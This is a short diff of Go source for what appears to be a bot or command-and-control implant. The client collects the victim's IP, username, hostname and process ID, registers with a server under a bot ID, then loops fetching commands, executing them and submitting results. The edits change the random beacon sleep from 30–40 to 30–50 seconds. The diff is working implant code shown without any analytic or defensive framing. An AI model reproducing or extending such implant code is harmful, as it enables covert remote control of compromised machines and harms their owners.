@@ -23,6 +23,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	//"github.com/Showmax/go-fqdn"
 	//"reflect"
 	//"math/rand"
 )
@@ -272,7 +273,7 @@ func randInt(min, max int) int {
 	return min + rand.Intn(max-min)
 }
 
-// Sleep randomly between 30 and 40 seconds - hardcoded for now
+// Sleep randomly between intervalMin and intervalMax
 func randSleep(min, max int) time.Duration {
 	rand.Seed(time.Now().UnixNano())
 	interval := time.Duration(randInt(min, max))
@@ -283,8 +284,12 @@ func main() {
 	ip := GetOutboundIP()
 	user, _ := user.Current()
 	osName, _ := os.Hostname()
+	//fmt.Println(fqdn.Get())
 	username := user.Username
 	pid := strconv.Itoa(os.Getpid())
+
+	intervalMin := 30
+	intervalMax := 50
 
 	registerkey = firstContact()
 	if strings.Contains(registerkey, "[-]") {
@@ -296,7 +301,7 @@ func main() {
 			}
 
 			// Sleeps randomly for 30~40 seconds
-			time.Sleep(randSleep(30, 40) * time.Second)
+			time.Sleep(randSleep(intervalMin, intervalMax) * time.Second)
 		}
 	}
 
@@ -313,7 +318,7 @@ func main() {
 			if registerResult == true {
 				break
 			}
-			time.Sleep(randSleep(30, 40) * time.Second)
+			time.Sleep(randSleep(intervalMin, intervalMax) * time.Second)
 		}
 	}
 
@@ -341,7 +346,7 @@ func main() {
 		command := fetchCommand(registerkey, BOTID)
 
 		if strings.Contains(command, "[-]") == true {
-			time.Sleep(randSleep(30, 40) * time.Second)
+			time.Sleep(randSleep(intervalMin, intervalMax) * time.Second)
 			continue
 		}
 
@@ -349,7 +354,7 @@ func main() {
 		//fmt.Println("[DEBUG] result = ", execute_result)
 		submitResult(registerkey, BOTID, execute_result)
 
-		time.Sleep(randSleep(30, 40) * time.Second)
+		time.Sleep(randSleep(intervalMin, intervalMax) * time.Second)
 
 	}
 
